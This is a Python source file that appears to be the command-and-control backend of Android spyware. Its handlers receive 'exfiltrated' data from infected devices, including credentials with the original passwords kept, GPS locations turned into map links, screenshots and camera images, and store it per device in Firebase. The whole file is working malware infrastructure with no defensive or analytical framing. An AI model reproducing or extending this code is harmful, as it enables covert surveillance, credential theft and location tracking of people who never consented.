import base64
import datetime
import json
import zlib
from firebase_client import push_data, update_data, set_data
from device_manager import DeviceManager
from crypto import decrypt_aes_cbc
from utils import sanitize_dict
from log_util import logger


def handle_exfil_data(request_handler, post_data):
    """Handle incoming exfiltrated data"""
    logger.debug(f"Received {len(post_data)} bytes of exfil data")

    try:
        # Try to decompress if data is compressed
        try:
            decompressed_data = zlib.decompress(post_data)
            data = decompressed_data
            logger.debug("Successfully decompressed zlib data")
        except Exception as decomp_error:
            logger.debug(f"Data is not compressed or decompression failed: {str(decomp_error)}")
            data = post_data

        # Try to decode JSON
        try:
            logger.debug("Attempting to parse as JSON...")
            decoded_data = data.decode('utf-8')
            logger.debug(f"First 200 chars of data: {decoded_data[:200]}...")

            json_data = json.loads(decoded_data)
            # Log successful receipt of data
            logger.info(f"Received data type: {json_data.get('type', 'unknown')}")

            # Process data before saving it
            processed_data = process_exfil_data(json_data)

            # Save the data to Firebase
            save_exfil_data(processed_data)

            # Respond with success
            request_handler.send_response(200)
            request_handler.send_header("Content-type", "application/json")
            request_handler.end_headers()
            request_handler.wfile.write(json.dumps({"status": "success", "message": "Data received"}).encode())

        except json.JSONDecodeError as json_error:
            logger.warning(f"JSON decode error: {str(json_error)}")
            # If not JSON, handle as binary data (like camera images)
            handle_binary_data(request_handler, data)

    except Exception as e:
        logger.error(f"Error processing exfiltrated data: {str(e)}")
        logger.exception("Full exception details:")
        request_handler.send_response(400)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())


def process_exfil_data(json_data):
    """Process and format exfiltrated data"""
    data_type = json_data.get('type', 'unknown')
    device_id = json_data.get('device_id', 'unknown_device')

    # Add processing timestamp
    json_data['processed_timestamp'] = datetime.datetime.now().isoformat()

    # Look for device ID in nested data field
    if 'data' in json_data and isinstance(json_data['data'], str):
        try:
            # Parse the nested data
            nested_data = json.loads(json_data['data'])

            # Extract real device ID if present
            if 'device_id' in nested_data and nested_data['device_id'] != 'unknown_device':
                real_device_id = nested_data['device_id']
                json_data['device_id'] = real_device_id
                device_id = real_device_id
                logger.info(f"Extracted device ID {real_device_id} from nested data")

                # If we have device info, register/update the device
                device_info = {}
                if 'device_model' in nested_data:
                    device_info['model'] = nested_data['device_model']
                if 'android_version' in nested_data:
                    device_info['android_version'] = nested_data['android_version']
                if 'manufacturer' in nested_data:
                    device_info['manufacturer'] = nested_data['manufacturer']

                if device_info:
                    DeviceManager.register_device(real_device_id, device_info)
        except json.JSONDecodeError:
            # Not valid JSON, ignore
            pass

    # Check for client_id which might be the device id if device_id is unknown
    if device_id == 'unknown_device' and 'client_id' in json_data:
        real_device_id = json_data['client_id']
        json_data['device_id'] = real_device_id
        device_id = real_device_id
        logger.info(f"Using client_id {real_device_id} as device_id")

    # Special processing for different data types
    if data_type == 'location_data':
        # Check if we have coordinates
        if 'latitude' in json_data and 'longitude' in json_data:
            json_data['map_url'] = f"https://maps.google.com/?q={json_data['latitude']},{json_data['longitude']}"
        # Check nested data for location
        elif 'data' in json_data and isinstance(json_data['data'], str):
            try:
                nested_data = json.loads(json_data['data'])
                if 'latitude' in nested_data and 'longitude' in nested_data:
                    lat = nested_data['latitude']
                    lng = nested_data['longitude']
                    json_data['latitude'] = lat
                    json_data['longitude'] = lng
                    json_data['map_url'] = f"https://maps.google.com/?q={lat},{lng}"
            except json.JSONDecodeError:
                pass

    elif data_type == 'screenshot' or data_type == 'camera_image':
        # Ensure image data is properly formatted for display
        pass

    elif data_type == 'credentials':
        # Sanitize credential data
        if 'password' in json_data:
            # Obfuscate the password in logs but keep original
            logger.debug(f"Credential data from {json_data.get('source', 'unknown source')}")

    return json_data


def save_exfil_data(json_data):
    """Save received JSON data to Firebase"""
    data_type = json_data.get('type', 'unknown')
    device_id = json_data.get('device_id', 'unknown_device')
    timestamp = datetime.datetime.now().isoformat()

    try:
        # Update device last seen
        DeviceManager.update_device_last_seen(device_id)

        # Add timestamp to the data
        json_data['received_timestamp'] = timestamp

        # Push data to Firebase
        # Convert the entire payload to string to avoid key validation issues
        push_data(f'exfiltrated_data/{device_id}/{data_type}', {
            "timestamp": timestamp,
            "metadata": {
                "source": "android_device",
                "dataType": data_type,
                "deviceId": device_id
            },
            "payload": json.dumps(json_data)  # Store as string to avoid key validation issues
        })

        logger.info(f"Saved {data_type} data to Firebase for device {device_id}")
        return True
    except Exception as e:
        logger.error(f"Error saving data to Firebase: {str(e)}")
        return False


def handle_binary_data(request_handler, data, data_type=None):
    """Handle non-JSON exfiltrated data"""
    data_type = data_type or request_handler.headers.get('X-Data-Type', 'unknown')
    device_id = request_handler.headers.get('X-Device-ID', 'unknown_device')
    timestamp = datetime.datetime.now().isoformat()

    try:
        # Update device last seen
        DeviceManager.update_device_last_seen(device_id)

        # Convert binary data to base64 for storage
        encoded_data = base64.b64encode(data).decode('utf-8')

        # Build a structured payload
        payload = {
            "timestamp": timestamp,
            "type": data_type,
            "device_id": device_id,
            "content_type": request_handler.headers.get('Content-Type', 'application/octet-stream'),
            "data": encoded_data
        }

        # For image types, add additional formatting info
        if data_type in ['screenshot', 'camera_image']:
            payload["image_data"] = encoded_data

        # Store binary data as base64 in Firebase
        push_data(f'exfiltrated_data/{device_id}/{data_type}', {
            "timestamp": timestamp,
            "metadata": {
                "source": "android_device",
                "dataType": data_type,
                "deviceId": device_id,
                "contentType": request_handler.headers.get('Content-Type', 'application/octet-stream')
            },
            "payload": json.dumps(payload)  # Store structured payload as string
        })

        logger.info(f"Saved binary {data_type} data to Firebase for device {device_id}")

        # Respond with success
        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({
            "status": "success",
            "message": f"{data_type} data received"
        }).encode())

        return True
    except Exception as e:
        logger.error(f"Error processing binary data: {str(e)}")
        request_handler.send_response(400)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
        return False


def handle_analytics_data(request_handler, post_data):
    """Handle incoming analytics data from the app"""
    logger.debug(f"Received {len(post_data)} bytes of analytics data")

    try:
        # Parse the JSON directly since analytics data is usually not compressed
        data = json.loads(post_data.decode('utf-8'))

        # Sanitize keys in the analytics data
        data = sanitize_dict(data)

        # Add metadata
        data['received_at'] = datetime.datetime.now().isoformat()
        data['client_ip'] = request_handler.client_address[0]

        # Save to Firebase
        client_id = request_handler.headers.get('X-Device-ID', 'unknown')
        push_data(f'analytics/{client_id}', data)

        logger.info(f"Saved analytics data for client {client_id}")

        # Return success
        request_handler.send_response(200)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"status": "success", "message": "Analytics received"}).encode())
        return True
    except Exception as e:
        logger.error(f"Error processing analytics data: {str(e)}")
        request_handler.send_response(400)
        request_handler.send_header("Content-type", "application/json")
        request_handler.end_headers()
        request_handler.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
        return False